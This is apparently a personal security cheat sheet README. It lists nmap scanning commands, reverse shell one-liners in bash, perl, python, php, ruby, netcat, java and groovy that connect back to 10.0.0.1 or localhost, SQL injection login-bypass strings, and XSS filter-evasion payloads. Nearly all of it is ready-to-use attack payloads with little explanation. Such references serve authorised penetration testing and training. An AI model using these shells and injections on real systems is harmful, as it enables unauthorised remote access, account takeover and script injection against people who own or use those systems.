# cheatsheetz
various cheatsheets on security and such

# recon 
```
# quick discovey on network
netdiscover

# enumeration scan
nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt

# enumeration scan TCP/UDP, output to file
nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip

# all TCP/UDP ports
nmap -v -sU -sS -p- -A -T4 $ip

# scan with active connect to avoid fake ports
nmap -p1-65535 -A -T5 -sT $ip
```

# reverse shells (thanks to pentest monkey for most of it)
```
# bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

# perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

# ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# netcat
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f


# java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


# mysql injection 101
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```

# xss tricks
```
<sCript>...</sCript>
<sc<script>ript>...</sc</script>ript>
http://site/index.php?name=<img src='zzzz' onerror='alert("1")' />
# javascript eval
http://site/index.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,48,55,56,51,51,49,56,97,45,101,97,52,48,45,52,100,100,102,45,97,57,52,49,45,53,99,100,51,56,53,48,53,101,51,48,56,39,41))</script>
# php_self
http://site/example.php/"><script>alert('xss')</script>
# anchor
http://site/index.php#<script>alert('xss')</script>
```
